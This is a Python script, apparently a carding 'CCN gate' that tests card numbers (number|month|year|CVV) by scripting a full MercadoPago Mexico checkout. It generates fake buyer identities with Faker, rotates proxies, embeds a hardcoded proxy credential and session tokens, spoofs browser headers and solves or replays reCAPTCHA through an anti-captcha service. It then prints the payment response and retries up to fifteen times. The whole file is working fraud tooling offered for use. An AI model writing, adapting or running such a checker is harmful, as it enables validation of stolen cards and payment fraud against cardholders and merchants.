import email
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'www.mercadopago.com.mx',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': '_mp_esc_=; _mp_esc_=; p_dsid=eacc0502-df8a-4292-bc8f-267ac2994deb-1723846288562; _d2id=003f3b60-c000-4d26-9029-2a26dbabbbfb; _csrf=Ro9MNTcfM9TkVJ1s4N5UvIok; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSession_585655=eyJpZCI6IjJkMDgzYzY0LTdlNTctNGNmNS1iMGUwLWFhOTAyMzMzMDllMiIsImMiOjE3NDI4Mzk5Njc0MjQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSessionUser_585655=eyJpZCI6IjM3OTRiYTJiLWNlODctNTVjYi1iMmFhLTcwYjczOTZhZjg1ZCIsImNyZWF0ZWQiOjE3NDI4Mzk5Njc0MjMsImV4aXN0aW5nIjp0cnVlfQ==; app-theme=yellowblue-light; p_edsid=2c82959e-1083-3271-88f2-06bb60a4c096-1742843850152',
                'device-memory': '8',
                'downlink': '5.45',
                'dpr': '1.5',
                'ect': '4g',
                'pragma': 'no-cache',
                'rtt': '250',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'viewport-width': '1029',
            }

            params = {
                'preference-id': '271016919-f32c9508-829b-4668-87bf-48472df1443f',
                'router-request-id': 'f5e1a9a3-c1b0-4688-ba28-b1b1f89e0cf2',
                'p': 'ecc97a28121faa68d012e6fc93d472f5',
            }

            responseChk = requests.get(
                'https://www.mercadopago.com.mx/checkout/v1/payment/redirect',
                params=params,
                headers=headers,
            )
            soup = b(responseChk.text, 'html.parser')
            print(soup)

            

            headers = {
                'authority': 'www.mercadopago.com.mx',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'p_dsid=eacc0502-df8a-4292-bc8f-267ac2994deb-1723846288562; _d2id=003f3b60-c000-4d26-9029-2a26dbabbbfb; _csrf=Ro9MNTcfM9TkVJ1s4N5UvIok; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSession_585655=eyJpZCI6IjJkMDgzYzY0LTdlNTctNGNmNS1iMGUwLWFhOTAyMzMzMDllMiIsImMiOjE3NDI4Mzk5Njc0MjQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSessionUser_585655=eyJpZCI6IjM3OTRiYTJiLWNlODctNTVjYi1iMmFhLTcwYjczOTZhZjg1ZCIsImNyZWF0ZWQiOjE3NDI4Mzk5Njc0MjMsImV4aXN0aW5nIjp0cnVlfQ==; app-theme=yellowblue-light; p_edsid=4c758fe8-5a56-3b28-bc7c-64d83adbe692-1742842660432',
                'device-memory': '8',
                'downlink': '0.65',
                'dpr': '1.5',
                'ect': '3g',
                'origin': 'https://www.mercadopago.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://www.mercadopago.com.mx/checkout/v1/payment/redirect/6bc84d76-ac6c-4e08-82c4-81116714878e/payment-option-form-v2/?preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                'rtt': '350',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'viewport-width': '1029',
                'x-csrf-token': 'So9InoxR-OUd1SAOD2xuVxetFf9aLXY6kCxc',
                'x-idempotency-key': '6',
                'x-newrelic-id': 'XQ4OVF5VGwIAXFNSAwQAU1Q=',
            }

            params = ''

            json_data = {
                'type': 'redirect',
                'urlParams': 'preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                'id': 'selected_payment_option',
                'values': {
                    'order': '1',
                    'max_installment_no_interest_label': '',
                    'title_full_text': '',
                    'id': 'new_card_row',
                    'payment_method_id': '',
                    'payment_type_id': '',
                    'title': 'Tarjeta de crédito',
                    'text': '',
                    'next_step': 'card_step',
                    'icon_uitype': 'generic_payment_card_icon',
                    'header': '',
                    'children': [],
                    'custom_attributes': {
                        'attributes': {
                            'pending_challenges': [
                                'SECOND_FACTOR',
                            ],
                        },
                        'empty': False,
                    },
                    'status': '',
                    'financial_institutions': [],
                    'balance': 0,
                    'max_allowed_amount': 0,
                    'min_allowed_amount': 0,
                    'fullTitle': '',
                    'description': '',
                    'promotion': '',
                    'method': 'new_card_row',
                    'type': 'selected_payment_option',
                },
                'isNewInterface': True,
                'configMelisessionFE': False,
                'sessionIdScript': '6bc84d76-ac6c-4e08-82c4-81116714878e',
                'sessionIdScriptFromFlows': '',
                'meliSession': False,
                'version': 'checkout',
                'prev_step': 'payment_option_form_v2',
            }

            response = c.put(
                'https://www.mercadopago.com.mx/checkout/v1/payment/api/flow/6bc84d76-ac6c-4e08-82c4-81116714878e',
                params=params,
                headers=headers,
                json=json_data,
            )
            



            headers = {
                'authority': 'api.mercadopago.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'x-product-id',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://api-static.mercadopago.com',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'public_key': 'APP_USR-cc2da681-6c59-4489-ba95-86ce3c0aedb3',
                'locale': 'es-MX',
                'referer': 'https://www.mercadopago.com.mx/checkout/v1/payment/redirect/6bc84d76-ac6c-4e08-82c4-81116714878e/card-form/?preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
            }

            response = c.options('https://api.mercadopago.com/v1/card_tokens', params=params, headers=headers)
            



            headers = {
                'authority': 'api.mercadopago.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'text/plain;charset=UTF-8',
                'origin': 'https://api-static.mercadopago.com',
                'pragma': 'no-cache',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-product-id': 'C6N31CHL2KK4U8V6P7IG',
            }

            params = {
                'public_key': 'APP_USR-cc2da681-6c59-4489-ba95-86ce3c0aedb3',
                'locale': 'es-MX',
                'referer': 'https://www.mercadopago.com.mx/checkout/v1/payment/redirect/6bc84d76-ac6c-4e08-82c4-81116714878e/card-form/?preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
            }

            name = name+' '+last
            session_id = "6bc84d76-ac6c-4e08-82c4-81116714878e"
            card_number = cc_number
            expiration_month = mes
            expiration_year = ano_number
            security_code = cvv

            data = f'{{"cardholder":{{"name":"{name}"}}, "device":{{"meli":{{"session_id":"{session_id}"}}}}, "card_number":"{card_number}", "expiration_month":"{expiration_month}", "expiration_year":"{expiration_year}", "security_code":"{security_code}"}}'


            response = c.post('https://api.mercadopago.com/v1/card_tokens', params=params, headers=headers, data=data)

            try:
                headers = {
                    'authority': 'www.mercadopago.com.mx',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    # 'cookie': 'p_dsid=eacc0502-df8a-4292-bc8f-267ac2994deb-1723846288562; _d2id=003f3b60-c000-4d26-9029-2a26dbabbbfb; _csrf=Ro9MNTcfM9TkVJ1s4N5UvIok; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSession_585655=eyJpZCI6IjJkMDgzYzY0LTdlNTctNGNmNS1iMGUwLWFhOTAyMzMzMDllMiIsImMiOjE3NDI4Mzk5Njc0MjQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSessionUser_585655=eyJpZCI6IjM3OTRiYTJiLWNlODctNTVjYi1iMmFhLTcwYjczOTZhZjg1ZCIsImNyZWF0ZWQiOjE3NDI4Mzk5Njc0MjMsImV4aXN0aW5nIjp0cnVlfQ==; app-theme=yellowblue-light; p_edsid=4c758fe8-5a56-3b28-bc7c-64d83adbe692-1742842660432',
                    'device-memory': '8',
                    'downlink': '1.35',
                    'dpr': '1.5',
                    'ect': '3g',
                    'origin': 'https://www.mercadopago.com.mx',
                    'pragma': 'no-cache',
                    'referer': 'https://www.mercadopago.com.mx/checkout/v1/payment/redirect/6bc84d76-ac6c-4e08-82c4-81116714878e/installments/?preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                    'rtt': '350',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'viewport-width': '1029',
                    'x-csrf-token': 'So9InoxR-OUd1SAOD2xuVxetFf9aLXY6kCxc',
                    'x-idempotency-key': '20',
                    'x-newrelic-id': 'XQ4OVF5VGwIAXFNSAwQAU1Q=',
                }

                params = ''

                json_data = {
                    'type': 'redirect',
                    'urlParams': 'preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                    'id': 'select_installments',
                    'values': {
                        'installments': {
                            'id': '1',
                            'rate': '0',
                        },
                    },
                    'configMelisessionFE': False,
                    'sessionIdScript': '6bc84d76-ac6c-4e08-82c4-81116714878e',
                    'sessionIdScriptFromFlows': '6bc84d76-ac6c-4e08-82c4-81116714878e',
                    'meliSession': False,
                    'version': 'checkout',
                    'prev_step': 'installments_form',
                }

                response = c.put(
                    'https://www.mercadopago.com.mx/checkout/v1/payment/api/flow/6bc84d76-ac6c-4e08-82c4-81116714878e',
                    params=params,
                    
                    headers=headers,
                    json=json_data,
                )
            except:
                print("")
            headers = {
                'authority': 'www.mercadopago.com.mx',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'p_dsid=eacc0502-df8a-4292-bc8f-267ac2994deb-1723846288562; _d2id=003f3b60-c000-4d26-9029-2a26dbabbbfb; _csrf=Ro9MNTcfM9TkVJ1s4N5UvIok; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSession_585655=eyJpZCI6IjJkMDgzYzY0LTdlNTctNGNmNS1iMGUwLWFhOTAyMzMzMDllMiIsImMiOjE3NDI4Mzk5Njc0MjQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _mldataSessionId=031c04e8-d367-4aa0-a011-6407593841bd; _hjSessionUser_585655=eyJpZCI6IjM3OTRiYTJiLWNlODctNTVjYi1iMmFhLTcwYjczOTZhZjg1ZCIsImNyZWF0ZWQiOjE3NDI4Mzk5Njc0MjMsImV4aXN0aW5nIjp0cnVlfQ==; app-theme=yellowblue-light; p_edsid=4c758fe8-5a56-3b28-bc7c-64d83adbe692-1742842660432',
                'device-memory': '8',
                'downlink': '1.35',
                'dpr': '1.5',
                'ect': '3g',
                'origin': 'https://www.mercadopago.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://www.mercadopago.com.mx/checkout/v1/payment/redirect/6bc84d76-ac6c-4e08-82c4-81116714878e/review/?preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                'rtt': '350',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'viewport-width': '1029',
                'x-csrf-token': 'So9InoxR-OUd1SAOD2xuVxetFf9aLXY6kCxc',
                'x-idempotency-key': '27',
                'x-newrelic-id': 'XQ4OVF5VGwIAXFNSAwQAU1Q=',
            }

            params = ''

            json_data = {
                'type': 'redirect',
                'urlParams': 'preference-id=271016919-f32c9508-829b-4668-87bf-48472df1443f&router-request-id=aebe6d71-4fa7-4836-bbf0-b59ff48a2f71&p=8dee9b0407063fbbbaab05e4d79ca7f7',
                'id': 'pay',
                'values': {
                    'payer': {
                        'email': email,
                    },
                    'captchaToken': '03AFcWeA4GbeInV-Z5ASiTIz9wWoB56qP1QS8qRoVF_TDFqMe0nrLP2L0aiGfjdLL3Soi3QKUChJM_nLuUU7XBDs6jO1T1DpLoO5m_QqRm9t-6kv9ah8sWx55lBmfAq0Es8sE8tH_D5RW8hSZJvUio__OzmWjW1ewaVG7qx0RIp0EIE5B9tjzWSxuGw9HKKbMjDLrKMBXC8-QaC6TaRskWitN36YqmlGx5L_mN_pgoJT7JFEwEAcjPXm8JzVxhXkdWOZRhWZ4sLK0SSfUjdhomG_mYHDrqaXpd0YZhkoIjq2Kxk9gkx7Z1faiFahHl2dhJL74FYn-eEeuF6Cs_7uqY2K-lRbT710OeYvcnoAw02hIFyBvxK--igVCPNtZfiBQ6EzCQIPuTnuOJ_TmatXr4QSTm2a5uBfw9stDRqq9PD93WdZBveWtTFNBFrf7dEHTt1bHTWdNBfQ3MohheR9Noc2ahtVnJK4ORhyOywkvOtpuzROlK62hUy_BxHj4R_hRdPdiQIra3YbG2yewQQIgE9d2EIO8XxhwdWjJSl1CQM1DToukHZJVDiGjGxcd47_FWv0k_2oHwGX-yH7Zm4Jej-kuN5Bz66F9Lrclu99URIU73UQG8CIb-q5r9NMvgepbP2uBmb9PNl5fcLbKdTbuTgV5wQGhvGAZqnO2Y8eO-pt5mbGJYETxYTrJTtt_WqZpSR2I5XpqtPkEHPEk-hnB4PHvzk90JWmu8AWdGuf-R2QfNxM0sUCO8zQiR2EKJr-I_CSdg66GaqlpB7hDrWngbgWTKaOLjXVgqhlBPMlm_1EtGgV9U4PQqkHbDpDRaqxljNd4TPkOImJ_4DV2XkclS9rGcXY3c3Uqs_ybPmRgNTQvVnMg9Ogkt10BVg-yI3WZ1OeqQCMGnnp9n_i7zTYHnrJnhh50bd5BQPyEXJcjIkuRqEHEFq7WrwM47bhrXxXb6F4nQap1zVFH5ynal0p4WEW3I7nR1sBD5AYV7vKN868NuAp-39RFZUiEoz6F7sYMZtUtOnNTLAt8GiQZjGiiQVEeiOPMJyjmtqFMQGAsEjB8YjivIo093OYa1CHTxrARKAq18W_7k2cguKFY7OhRLaJBBs9nVd8Ebrm6rEh1OU0YBgjRfu7fQ8uspe6HESdOEShgo4J4k-q8I5nl-F_xTGu7wldKA0vPLG39CkAdjHc5AIpMohWlIdf4b1tRIwzdME-9InHZ9l9clgpeOIOYuFKlsiTbyQByK41ia1I2qCOPD6UsaGDkJcNk7SC5kzbt7LdVKMwVGuYu8PKc6a-qSX7pThQBdGJDuSWCMa3RDwmAqE2L8uJB9xruPyzp4Qjn1x8ZEaJ5N1_43I7kvzzEyp88mPOg7CRYLyVHlLlRhHNnioBX7W1Vzv98hbj2K3DwAXEMm30Q3GesXuDUKr6C9foXGOseTwNZpIKEB6oEChF12cqJ-NrJ9Lvs6pD_lLaiosdRScDjszJLT4Oq1lwIj8nvH7Wa2Qmtobim89VZBSoPgqmSquy7MUvC4eweOFJOBHjbEEF_rh4Bmwnf-pkfLu7u-OqunYNbQoHt_Wa11wXekPGs52XEhXvZ1AF8bZH_2FMHCCO5k26JapYC3qn7076nRPcv4hlF_HqLHMOHE4tvF4NGLJZi0pxoi42p3XXTySaT8r6pKBeUrxpWPODm9rhtaLqoZE6eu17yxELkKE-cQWYqIclRcTgOkFxe8vo3cyEFndmWCJDF1rjGyDKw0LFEvrN8kJtXt69xoR9FON_pQjCE6XFlD8Czo_DPLj27N0LdeRBdSXlOB4bbjkNvXctwN4LBhvCJdQMvHkDVLIfJLQn1D6J0oW9Zj5UtiPtPT4zetxgtEYIlVBJggd0P3_Cift983fzQllLP-dKqzZXarjbNig_khtAVzbTpvHMZkf_7EvjPaGgyhEh8DLpv5IA8qXAsF59P0LniK_imSYUcgilFUVp6QE7l1dqMXk4D63jSRqx_hE0pukXLr1UieYFksrg1Y-wA6fPG2JP-yio7kuwbFktD5OP8ms8_LyO0HENZcYPYBrkrx-sglgcj_h1u1UjW0UMDs5H1UUSuaFHWCurZP2tUpRJaksnyjocE3pTZFPv7mR4LFmCJCteZLR-P3gYqRmeoM_KR5xu7iG-t2Jz8ToueUfs-MZJvJz-FJ-i5lkIyUGBcMKK2UBH-DiJY8CUAt7ABYDLZRLzCj79BxPnmD6TqdOa12jU5NZ534hivbyQND0hcmD7RKwOdsfe1cFZCzLT9kdERmehpWCi5_4oJJEYbbZO95krE_exGbOr7d8ZV1vmeQprkkwctGpRmKKETtil677eqpXauZQeS-o6G8c2U0dWVOSPHZqhU9V1ms5lBg3YN5',
                },
                'configMelisessionFE': False,
                'sessionIdScript': '6bc84d76-ac6c-4e08-82c4-81116714878e',
                'sessionIdScriptFromFlows': '6bc84d76-ac6c-4e08-82c4-81116714878e',
                'meliSession': False,
                'version': 'checkout',
                'prev_step': 'review',
            }

            response = c.put(
                'https://www.mercadopago.com.mx/checkout/v1/payment/api/flow/6bc84d76-ac6c-4e08-82c4-81116714878e',
                params=params,
                headers=headers,
                json=json_data,
            )
            responsePm = json.loads(response.text)
            print_all_texts(responsePm)

            
                                                

          

                    
            print("Status Code:", response.status_code)
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("4812830883245011|02|2030|000"))